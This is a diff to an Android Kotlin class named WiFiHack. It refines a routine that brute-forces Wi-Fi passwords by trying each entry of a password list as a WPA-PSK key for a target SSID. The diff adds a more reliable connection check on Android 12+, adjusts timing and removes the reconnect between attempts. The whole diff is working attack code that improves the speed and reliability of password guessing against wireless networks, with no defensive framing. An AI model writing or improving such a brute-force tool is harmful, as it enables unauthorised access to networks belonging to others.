@@ -4,15 +4,16 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.net.wifi.ScanResult
 import android.net.wifi.WifiConfiguration
 import android.net.wifi.WifiManager
+import android.os.Build
 import com.industrialble.tools.RootChecker
 import kotlinx.coroutines.channels.awaitClose
 import kotlinx.coroutines.flow.Flow
 import kotlinx.coroutines.flow.callbackFlow
-import java.io.BufferedReader
-import java.io.InputStreamReader
 import java.util.concurrent.atomic.AtomicBoolean
 
 class WiFiHack(private val context: Context) {
@@ -75,6 +76,36 @@ class WiFiHack(private val context: Context) {
     /** Cancela la fuerza bruta en curso */
     fun cancelBruteForce() { bruteForceCancelled.set(true) }
 
+    /**
+     * Verifica si estamos conectados al SSID indicado.
+     * Primero intenta con connectionInfo (todas las API), luego verifica con
+     * ConnectivityManager en Android 12+ donde connectionInfo puede ser impredecible.
+     */
+    private fun isConnectedToSsid(targetSsid: String): Boolean {
+        // Verificar connectionInfo directamente
+        val info = wifiManager.connectionInfo
+        val currentSsid = info?.ssid?.removeSurrounding("\"") ?: ""
+        if (currentSsid == targetSsid) return true
+
+        // En Android 12+, connectionInfo puede devolver <unknown ssid>.
+        // Verificamos con ConnectivityManager si estamos en WiFi y reintentamos.
+        try {
+            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            for (network in cm.allNetworks) {
+                val caps = cm.getNetworkCapabilities(network) ?: continue
+                if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
+                    // Estamos conectados a WiFi, reintentar connectionInfo
+                    Thread.sleep(200)
+                    val retryInfo = wifiManager.connectionInfo
+                    val retrySsid = retryInfo?.ssid?.removeSurrounding("\"") ?: ""
+                    if (retrySsid == targetSsid) return true
+                }
+            }
+        } catch (_: Exception) { }
+
+        return false
+    }
+
     /** Fuerza bruta con velocidad personalizable y cancelable */
     @Suppress("DEPRECATION")
     fun bruteForce(
@@ -89,38 +120,63 @@ class WiFiHack(private val context: Context) {
         Thread {
             val cleanSsid = "\"${ssid.removeSurrounding("\"")}\""
             val targetSsid = cleanSsid.removeSurrounding("\"") // SSID sin comillas para comparar
+
             for ((index, password) in passwords.withIndex()) {
                 if (bruteForceCancelled.get()) { onFinish(false); return@Thread }
                 onProgress(index + 1, passwords.size, password)
+
                 try {
+                    // Configurar red con el método de autenticación correcto
                     val config = WifiConfiguration().apply {
                         SSID = cleanSsid
-                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
-                        if (password.isNotEmpty()) {
+                        if (password.isEmpty()) {
+                            // Red abierta
+                            allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
+                        } else {
+                            // WPA/WPA2-PSK
                             preSharedKey = "\"$password\""
                             allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                         }
                     }
+
                     val netId = wifiManager.addNetwork(config)
                     if (netId != -1) {
                         wifiManager.disconnect()
-                        Thread.sleep(300) // esperar a que se complete la desconexión
+                        Thread.sleep(500) // esperar desconexión
+
                         if (wifiManager.enableNetwork(netId, true)) {
+                            // Esperar a que se establezca la conexión
                             Thread.sleep(delayMs.toLong())
+
+                            // Verificar conexión por múltiples métodos
+                            var connected = false
+
+                            // Método 1: WifiManager.connectionInfo
                             val info = wifiManager.connectionInfo
-                            // Comparar SSIDs sin comillas para compatibilidad con Android 12+
-                            // (getSSID() devuelve sin comillas en API 31+, con comillas en versiones anteriores)
                             if (info != null) {
                                 val connectedSsid = info.ssid?.removeSurrounding("\"") ?: ""
-                                if (connectedSsid == targetSsid && info.networkId == netId) {
-                                    onFound(password); onFinish(true); return@Thread
+                                if (connectedSsid == targetSsid) {
+                                    connected = true
                                 }
                             }
+
+                            // Método 2: ConnectivityManager (más fiable en Android 12+)
+                            if (!connected) {
+                                connected = isConnectedToSsid(targetSsid)
+                            }
+
+                            if (connected) {
+                                onFound(password)
+                                onFinish(true)
+                                return@Thread
+                            }
                         }
+
+                        // Limpiar red fallida
                         wifiManager.removeNetwork(netId)
                         wifiManager.saveConfiguration()
-                        wifiManager.reconnect()
-                        Thread.sleep(200) // esperar antes del siguiente intento
+                        // No reconectar automáticamente a la red anterior para evitar interferencias
+                        Thread.sleep(300)
                     }
                 } catch (_: Exception) {}
             }
